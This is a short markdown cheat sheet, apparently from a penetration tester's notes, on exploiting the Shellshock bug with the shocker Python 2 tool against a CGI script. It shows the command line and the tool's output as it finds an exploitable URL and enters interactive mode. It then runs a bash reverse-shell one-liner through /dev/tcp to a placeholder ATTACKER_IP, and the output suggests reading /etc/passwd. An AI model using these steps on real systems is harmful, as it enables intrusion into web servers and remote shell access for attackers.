# shellshock python2 exploit
https://github.com/nccgroup/shocker

## reverse shell usage
```
python2 shocker.py -H $IP --cgi /cgi-bin/test/test.cgi

   .-. .            .
  (   )|            |
   `-. |--. .-.  .-.|.-. .-. .--.
  (   )|  |(   )(   |-.'(.-' |
   `-' '  `-`-'  `-''  `-`--''  v1.1

 Tom Watson, tom.watson@nccgroup.trust
 https://www.github.com/nccgroup/shocker

 Released under the GNU Affero General Public License
 (https://www.gnu.org/licenses/agpl-3.0.html)


[+] Single target '/cgi-bin/test/test.cgi' being used
[+] Checking connectivity with target...
[+] Target was reachable
[+] Looking for vulnerabilities on xxxxxxxxxxxxxx:80
[+] 1 potential target found, attempting exploits
[+] The following URLs appear to be exploitable:
  [1] http://xxxxxxxxxxxxxx:80/cgi-bin/test/test.cgi
[+] Would you like to exploit further?
[>] Enter an URL number or 0 to exit: 1
[+] Entering interactive mode for http://xxxxxxxxxxxxxx:80/cgi-bin/test/test.cgi
[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'
  > /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/80 0>&1'
```
